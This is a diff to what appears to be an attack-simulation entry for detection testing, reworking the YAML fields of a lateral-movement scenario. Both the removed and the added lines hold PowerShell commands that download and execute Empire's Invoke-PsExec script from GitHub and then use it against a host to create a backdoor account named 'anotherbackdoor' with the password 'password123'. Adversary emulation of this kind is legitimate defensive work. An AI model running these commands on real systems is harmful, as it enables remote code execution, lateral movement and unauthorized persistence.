@@ -54,8 +54,15 @@ simulation:
       name: PowerShell
       module: PowerShell
       script: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/lateral_movement/Invoke-PsExec.ps1
-  permissions_required:
-    - Administrator
-  adversary_view: |-
-    PS C:\Windows\system32> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/lateral_movement/Invoke-PsExec.ps1')
-    PS C:\Windows\system32> Invoke-PsExec -ComputerName 192.168.2.4 -Command "net user anotherbackdoor password123 /add" -ServiceName Updater32
+
+
+simulation:
+  executor: PowerShell
+  scriptUri: https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/lateral_movement/Invoke-PsExec.ps1
+  supportingFileUris:
+  commands: |-
+    IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BC-SECURITY/Empire/master/empire/server/data/module_source/lateral_movement/Invoke-PsExec.ps1')
+    Invoke-PsExec -ComputerName 192.168.2.4 -Command "net user anotherbackdoor password123 /add" -ServiceName Updater32
+  output: |-
+
+detection:
